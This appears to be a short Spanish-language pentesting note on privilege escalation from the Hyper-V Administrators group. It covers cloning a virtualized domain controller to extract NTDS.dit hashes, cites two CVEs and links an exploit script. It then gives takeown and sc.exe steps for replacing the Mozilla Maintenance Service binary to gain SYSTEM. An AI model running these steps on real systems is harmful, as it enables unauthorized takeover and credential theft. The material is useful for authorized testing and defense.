
Tienen acceso completo a las caracteristicas Hyper-V. Si los DC se han virtualizado, entonces estos deben ser considerados como `Domain Admins`

Podrian crear un clon del DC y montar un disco virtual sin conexion para obtener el NTDS.dit y extraer los hashes NTLM

Si el sistema es vuln a [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) o [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), podemos aprovechar para obtener privilegios SYSTEM. De lo contrario podemos aprovechar una aplicacion en el servidor que haya instalado un servicio que ejecuta en SYSTEM y que puede ser iniciado por usuarios sin privs:

	Vamos a hacer este ultimo ejemplo con Mozilla Maintenance Service

[este exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) 

1. Tomamos posesion del archivo ejecutando el script PS

```
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

2. Reemplazamos el archivo por un maintenanceservice.exe malicioso, iniciamos el servicio y obtenemos ejecucion como SYSTEM

```
sc.exe start MozillaMaintenance
```
